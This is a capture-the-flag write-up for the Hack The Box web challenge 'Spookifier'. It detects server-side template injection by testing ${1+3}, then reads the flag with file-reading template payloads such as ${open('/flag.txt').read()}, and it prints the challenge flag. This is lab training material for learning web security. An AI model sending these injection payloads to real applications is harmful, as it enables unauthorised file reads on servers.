# Spookifier
> Write-up author: jon-brandy
## DESCRIPTION:
There's a new trend of an application that generates a spooky name for you. 
Users of that application later discovered that their real names were also magically changed, causing havoc in their life. 
Could you help bring down this application?
## HINT:
- NONE
## STEPS:
1. Let's open the host given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209550314-bf2c9973-9be9-414b-8cbd-ff537420b4ef.png)


2. Let's input `Hallo`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209550511-9a0f8bce-71fe-48dc-9c6c-667345089714.png)


3. Notice our input displayed as the parameter value.

![image](https://user-images.githubusercontent.com/70703371/209550550-5670a127-78d8-4535-8505-92be6b862090.png)


4. Let's try to input addition. | ${1+3}

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209551500-dfbe3c18-04e6-4de8-974a-33c41024f06b.png)


5. Based from the result we got, we can suggest that the website is vuln to **SSTI**.
6. Let's input another payload.

```
${system('cat flag.txt')}
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209551600-f274c144-a0f5-4d87-bf35-e27e149b44d0.png)


7. Hmm.. try this one now:

```php
${open('/flag.txt').read()}
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209551922-8ac5bd58-36cc-4715-81b0-1f000781c9cb.png)


8. Got the flag!

## FLAG

```
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
```



## LEARNING REFERENCES:

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako
```
